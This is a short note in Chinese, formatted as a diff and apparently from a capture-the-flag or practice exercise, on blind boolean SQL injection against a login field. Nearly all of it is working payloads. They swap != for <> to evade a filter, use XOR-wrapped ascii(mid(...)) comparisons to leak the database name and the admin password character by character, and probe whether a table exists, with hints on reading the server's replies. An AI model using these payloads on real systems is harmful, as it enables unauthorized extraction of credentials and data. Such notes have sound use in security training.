@@ -1,0 +1,5 @@
+!= 号用 <>用代替
+同时 admin’^(ascii(mid(database()from(1)))<>97)^0# 多使用一个bool值 可以判断前面的语句是否出错
+admin'^(select(1)from(admin))^1#   返回password error!说明猜对了
+
+admin'^(ascii(mid((select(password)from(admin))from(1)))<>97)^0#
